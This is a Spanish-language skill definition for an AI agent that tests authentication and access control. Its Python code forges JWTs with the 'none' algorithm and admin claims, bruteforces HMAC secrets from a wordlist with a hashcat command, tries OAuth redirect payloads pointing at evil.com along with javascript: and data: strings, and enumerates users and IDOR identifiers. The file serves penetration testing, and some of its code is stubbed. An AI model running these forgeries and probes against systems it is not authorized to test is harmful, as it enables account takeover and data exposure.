---
name: auth-agent
description: Agente especializado en testing de autenticación y autorización. Usar para: (1) JWT/Session analysis, (2) OAuth/OIDC testing, (3) Password policy testing, (4) MFA bypass, (5) Session management, (6) Privilege escalation, (7) Access control testing. Trigger: cuando se necesite testear mecanismos de autenticación o control de acceso.
---

# 🔐 Auth Agent - Agente de Autenticación y Autorización

## Objetivo
Identificar vulnerabilidades en mecanismos de autenticación, gestión de sesiones y control de acceso.

## 1. Authentication Testing

### Password Policy Analysis
```python
import re

class PasswordPolicyTester:
    def __init__(self, registration_url):
        self.url = registration_url
        self.policy = {}
        
    def test_policy(self):
        """Determinar política de contraseñas"""
        test_passwords = [
            ("a", "Too short"),
            ("aaaaaaaa", "No complexity"),
            ("AAAAAAAA", "No lowercase"),
            ("aaaaaaa1", "No uppercase"),
            ("AAAAAaa1", "Might work"),
            ("Password1", "Common pattern"),
            ("123456789", "Only numbers"),
            ("password", "Common word"),
            ("P@ssw0rd!", "Complex")
        ]
        
        results = []
        for pwd, desc in test_passwords:
            # Hacer request de registro con esta contraseña
            # Analizar respuesta para determinar requisitos
            pass
        
        return results
    
    def check_common_passwords(self):
        """Verificar si acepta contraseñas comunes"""
        common = [
            "123456", "password", "12345678", "qwerty",
            "123456789", "12345", "1234", "111111",
            "1234567", "dragon", "123123", "baseball",
            "iloveyou", "trustno1", "sunshine", "princess"
        ]
        
        accepted = []
        for pwd in common:
            # Test registration/password change
            pass
        
        return accepted
```

### Brute Force Protection
```python
class BruteForceTest:
    def __init__(self, login_url):
        self.url = login_url
        
    def test_rate_limiting(self, username, attempts=20):
        """Verificar protección contra brute force"""
        results = {
            "endpoint": self.url,
            "attempts": [],
            "lockout_detected": False,
            "captcha_triggered": False,
            "delay_introduced": False
        }
        
        for i in range(attempts):
            start = time.time()
            
            r = requests.post(self.url, data={
                "username": username,
                "password": f"wrongpassword{i}"
            })
            
            elapsed = time.time() - start
            
            results["attempts"].append({
                "attempt": i + 1,
                "status": r.status_code,
                "response_time": elapsed,
                "response_size": len(r.text)
            })
            
            # Detectar cambios
            if "captcha" in r.text.lower():
                results["captcha_triggered"] = True
            if "locked" in r.text.lower() or "blocked" in r.text.lower():
                results["lockout_detected"] = True
            if elapsed > 2:  # Delay artificial
                results["delay_introduced"] = True
        
        return results
    
    def test_account_enumeration(self, usernames):
        """Verificar si es posible enumerar usuarios"""
        results = []
        
        for username in usernames:
            r = requests.post(self.url, data={
                "username": username,
                "password": "wrongpassword123"
            })
            
            results.append({
                "username": username,
                "status": r.status_code,
                "response_size": len(r.text),
                "response_hash": hash(r.text)
            })
        
        # Si las respuestas son diferentes, hay enumeration
        unique_responses = len(set(r["response_hash"] for r in results))
        
        return {
            "users_tested": usernames,
            "responses": results,
            "enumeration_possible": unique_responses > 1
        }
```

### Session Management
```python
class SessionTester:
    def __init__(self):
        self.sessions = []
        
    def analyze_session_token(self, token, token_type="cookie"):
        """Analizar token de sesión"""
        analysis = {
            "token": token[:50] + "..." if len(token) > 50 else token,
            "length": len(token),
            "type": token_type,
            "entropy": self._calculate_entropy(token),
            "patterns": [],
            "vulnerabilities": []
        }
        
        # Detectar patrones
        if re.match(r'^[a-f0-9]+$', token.lower()):
            analysis["patterns"].append("Hexadecimal")
        if re.match(r'^[A-Za-z0-9+/]+=*$', token):
            analysis["patterns"].append("Base64")
        if token.count('.') == 2:
            analysis["patterns"].append("JWT")
            
        # Detectar debilidades
        if len(token) < 32:
            analysis["vulnerabilities"].append("Short token - may be predictable")
        if analysis["entropy"] < 3.0:
            analysis["vulnerabilities"].append("Low entropy - may be predictable")
        
        return analysis
    
    def _calculate_entropy(self, s):
        """Calcular entropía de Shannon"""
        import math
        from collections import Counter
        
        if not s:
            return 0
        
        prob = [float(c) / len(s) for c in Counter(s).values()]
        return -sum(p * math.log2(p) for p in prob)
    
    def test_session_fixation(self, login_url, creds):
        """Test de session fixation"""
        session = requests.Session()
        
        # Obtener sesión antes de login
        pre_login = session.get(login_url)
        pre_session = session.cookies.get_dict()
        
        # Hacer login
        session.post(login_url, data=creds)
        post_session = session.cookies.get_dict()
        
        # Comparar
        return {
            "pre_login_session": pre_session,
            "post_login_session": post_session,
            "session_regenerated": pre_session != post_session,
            "vulnerable": pre_session == post_session
        }
    
    def test_concurrent_sessions(self, login_url, creds):
        """Verificar si permite sesiones concurrentes"""
        sessions = []
        
        for i in range(5):
            s = requests.Session()
            s.post(login_url, data=creds)
            sessions.append({
                "session_num": i + 1,
                "cookies": s.cookies.get_dict(),
                "valid": True  # Verificar con request autenticado
            })
        
        return {
            "sessions_created": len(sessions),
            "all_valid": all(s["valid"] for s in sessions),
            "concurrent_sessions_allowed": True
        }
```

## 2. JWT Testing

### JWT Deep Analysis
```python
import base64
import json
import hmac
import hashlib

class JWTAnalyzer:
    def __init__(self, token):
        self.token = token
        self.parts = token.split('.')
        self.header = None
        self.payload = None
        
        if len(self.parts) == 3:
            self.header = self._decode(self.parts[0])
            self.payload = self._decode(self.parts[1])
    
    def _decode(self, part):
        """Decodificar parte de JWT"""
        # Agregar padding si necesario
        padding = 4 - len(part) % 4
        if padding != 4:
            part += '=' * padding
        
        return json.loads(base64.urlsafe_b64decode(part))
    
    def _encode(self, data):
        """Codificar datos para JWT"""
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(',', ':')).encode()
        ).decode().rstrip('=')
    
    def full_analysis(self):
        """Análisis completo del JWT"""
        return {
            "header": self.header,
            "payload": self.payload,
            "vulnerabilities": self._find_vulnerabilities(),
            "claims_analysis": self._analyze_claims(),
            "attack_vectors": self._suggest_attacks()
        }
    
    def _find_vulnerabilities(self):
        """Buscar vulnerabilidades conocidas"""
        vulns = []
        
        # Algorithm vulnerabilities
        alg = self.header.get('alg', '')
        
        if alg == 'none':
            vulns.append({
                "type": "CRITICAL",
                "name": "None Algorithm",
                "description": "Token accepts 'none' algorithm - can forge tokens"
            })
        
        if alg.startswith('HS'):
            vulns.append({
                "type": "INFO",
                "name": "Symmetric Algorithm",
                "description": "Uses HMAC - try weak secret bruteforce"
            })
        
        if alg.startswith('RS') and self.header.get('jwk'):
            vulns.append({
                "type": "HIGH",
                "name": "JWK Injection",
                "description": "Embedded public key - may accept attacker's key"
            })
        
        # Payload vulnerabilities
        if 'exp' not in self.payload:
            vulns.append({
                "type": "MEDIUM",
                "name": "No Expiration",
                "description": "Token never expires"
            })
        
        if 'jti' not in self.payload:
            vulns.append({
                "type": "LOW",
                "name": "No JTI",
                "description": "No unique identifier - replay possible"
            })
        
        return vulns
    
    def _analyze_claims(self):
        """Analizar claims del payload"""
        analysis = {}
        
        # Standard claims
        standard = ['iss', 'sub', 'aud', 'exp', 'nbf', 'iat', 'jti']
        for claim in standard:
            if claim in self.payload:
                analysis[claim] = {
                    "present": True,
                    "value": self.payload[claim]
                }
        
        # Custom claims (potential targets)
        custom = {k: v for k, v in self.payload.items() if k not in standard}
        if custom:
            analysis["custom_claims"] = custom
        
        # Interesting claims for privilege escalation
        privilege_claims = ['role', 'admin', 'is_admin', 'permissions', 
                          'groups', 'scope', 'authorities', 'user_type']
        for claim in privilege_claims:
            if claim in self.payload:
                analysis["privilege_claims"] = {
                    claim: self.payload[claim]
                }
        
        return analysis
    
    def _suggest_attacks(self):
        """Sugerir vectores de ataque"""
        attacks = []
        
        alg = self.header.get('alg', '')
        
        # None algorithm attack
        attacks.append({
            "name": "None Algorithm",
            "payload": self.forge_none_alg()
        })
        
        # Algorithm confusion (RS256 to HS256)
        if alg.startswith('RS'):
            attacks.append({
                "name": "Algorithm Confusion",
                "description": "Change RS256 to HS256, sign with public key"
            })
        
        # Weak secret bruteforce
        if alg.startswith('HS'):
            attacks.append({
                "name": "Weak Secret Bruteforce",
                "tool": "hashcat -m 16500 jwt.txt wordlist.txt"
            })
        
        # Privilege escalation
        if any(k in self.payload for k in ['role', 'admin', 'is_admin']):
            attacks.append({
                "name": "Privilege Escalation",
                "payload": self.forge_admin()
            })
        
        return attacks
    
    def forge_none_alg(self):
        """Crear token con algoritmo none"""
        new_header = {"alg": "none", "typ": "JWT"}
        return f"{self._encode(new_header)}.{self._encode(self.payload)}."
    
    def forge_admin(self):
        """Crear token con privilegios admin"""
        new_payload = self.payload.copy()
        
        # Intentar diferentes variantes
        privilege_modifications = {
            "role": "admin",
            "admin": True,
            "is_admin": True,
            "permissions": ["*"],
            "user_type": "admin"
        }
        
        for key, value in privilege_modifications.items():
            if key in new_payload:
                new_payload[key] = value
        
        return f"{self._encode(self.header)}.{self._encode(new_payload)}.[SIGNATURE_NEEDED]"
    
    def bruteforce_secret(self, wordlist):
        """Intentar bruteforce del secret"""
        if not self.header.get('alg', '').startswith('HS'):
            return {"error": "Not a HMAC algorithm"}
        
        alg_map = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }
        
        alg = self.header.get('alg')
        hash_func = alg_map.get(alg)
        
        signing_input = f"{self.parts[0]}.{self.parts[1]}".encode()
        target_sig = self.parts[2]
        
        for secret in wordlist:
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input, hash_func).digest()
            ).decode().rstrip('=')
            
            if sig == target_sig:
                return {"secret_found": secret}
        
        return {"secret_found": None}


# Lista de secrets comunes para bruteforce
common_jwt_secrets = [
    "secret", "password", "123456", "jwt_secret_key",
    "your-256-bit-secret", "my_super_secret_key",
    "change_me", "development", "production",
    "shhhhh", "qwerty", "abc123"
]
```

## 3. OAuth/OIDC Testing

```python
class OAuthTester:
    def __init__(self, auth_url, token_url, client_id):
        self.auth_url = auth_url
        self.token_url = token_url
        self.client_id = client_id
        
    def test_redirect_uri_manipulation(self):
        """Probar manipulación de redirect_uri"""
        test_redirects = [
            "https://evil.com",
            "https://evil.com/callback",
            "https://target.com.evil.com",
            "https://target.com@evil.com",
            "https://target.com%40evil.com",
            "https://target.com#@evil.com",
            "https://target.com/.evil.com",
            "https://target.com/callback/../../../evil",
            "//evil.com",
            "https:///evil.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>"
        ]
        
        results = []
        for redirect in test_redirects:
            params = {
                "client_id": self.client_id,
                "redirect_uri": redirect,
                "response_type": "code",
                "scope": "openid"
            }
            
            r = requests.get(self.auth_url, params=params, 
                           allow_redirects=False)
            
            results.append({
                "redirect_uri": redirect,
                "status": r.status_code,
                "accepted": r.status_code in [200, 302],
                "location": r.headers.get("Location", "")
            })
        
        return results
    
    def test_state_parameter(self):
        """Verificar uso de state parameter (CSRF protection)"""
        # Request sin state
        params = {
            "client_id": self.client_id,
            "redirect_uri": "https://target.com/callback",
            "response_type": "code"
        }
        
        r = requests.get(self.auth_url, params=params)
        
        return {
            "state_required": "state" in r.text.lower() or r.status_code == 400,
            "csrf_protection": "state" in r.text.lower()
        }
    
    def test_token_leak(self):
        """Verificar token leak via Referer"""
        # response_type=token expone token en fragment
        # Puede filtrarse via Referer header
        
        return {
            "test": "Check if response_type=token is allowed",
            "risk": "Token may leak via Referer header to external resources"
        }
```

## 4. Authorization Testing

### IDOR Testing
```python
class IDORTester:
    def __init__(self, session):
        self.session = session
        self.findings = []
        
    def test_horizontal_access(self, endpoints):
        """
        Test acceso horizontal (mismo nivel de privilegio)
        endpoints: [{"url": "/api/user/{id}/data", "param": "id"}]
        """
        results = []
        
        for endpoint in endpoints:
            url_template = endpoint["url"]
            param = endpoint["param"]
            
            # Obtener ID del usuario actual
            current_id = self._get_current_user_id()
            
            # Probar otros IDs
            test_ids = self._generate_test_ids(current_id)
            
            for test_id in test_ids:
                url = url_template.replace(f"{{{param}}}", str(test_id))
                
                try:
                    r = self.session.get(url)
                    
                    if r.status_code == 200:
                        # Verificar si los datos son de otro usuario
                        data = r.json()
                        
                        if self._is_different_user_data(data, current_id):
                            results.append({
                                "endpoint": url_template,
                                "test_id": test_id,
                                "vulnerable": True,
                                "data_preview": str(data)[:200]
                            })
                except:
                    pass
        
        return results
    
    def test_vertical_access(self, admin_endpoints):
        """
        Test acceso vertical (diferente nivel de privilegio)
        admin_endpoints: URLs que solo admin debería acceder
        """
        results = []
        
        for endpoint in admin_endpoints:
            r = self.session.get(endpoint)
            
            results.append({
                "endpoint": endpoint,
                "status": r.status_code,
                "accessible": r.status_code == 200,
                "response_size": len(r.text)
            })
        
        return results
    
    def _generate_test_ids(self, current_id):
        """Generar IDs para probar"""
        test_ids = []
        
        if isinstance(current_id, int):
            test_ids.extend([
                current_id - 1,
                current_id + 1,
                1, 0, -1,
                current_id * 2,
                999999
            ])
        elif isinstance(current_id, str):
            # UUID
            if len(current_id) == 36:
                test_ids.extend([
                    "00000000-0000-0000-0000-000000000000",
                    "00000000-0000-0000-0000-000000000001",
                    current_id[:-1] + "0"
                ])
        
        return test_ids
```

## Workflow de Auth Testing

```
1. RECONOCIMIENTO
   ├── Identificar mecanismos de auth
   ├── Mapear flujos de login/registro
   ├── Detectar OAuth/OIDC
   └── Analizar tokens/sesiones

2. AUTENTICACIÓN
   ├── Password policy testing
   ├── Brute force protection
   ├── Account enumeration
   ├── Password reset flaws
   └── MFA bypass

3. SESIONES
   ├── Token analysis
   ├── Session fixation
   ├── Session timeout
   ├── Concurrent sessions
   └── Cookie security

4. JWT (si aplica)
   ├── Algorithm analysis
   ├── None algorithm attack
   ├── Weak secret bruteforce
   ├── Claim manipulation
   └── Key confusion

5. AUTORIZACIÓN
   ├── IDOR testing
   ├── Horizontal escalation
   ├── Vertical escalation
   └── Function-level access

6. OAUTH (si aplica)
   ├── Redirect URI manipulation
   ├── State parameter check
   ├── Token leak via Referer
   └── Scope manipulation
```

## Archivos de Salida

- `02-mapping/authentication/flows.md`
- `02-mapping/authorization/matrix.md`
- `03-vulnerabilities/A07-auth-failures/{vuln_id}.json`
- `03-vulnerabilities/A01-broken-access-control/{vuln_id}.json`
- `06-evidence/requests/auth/`
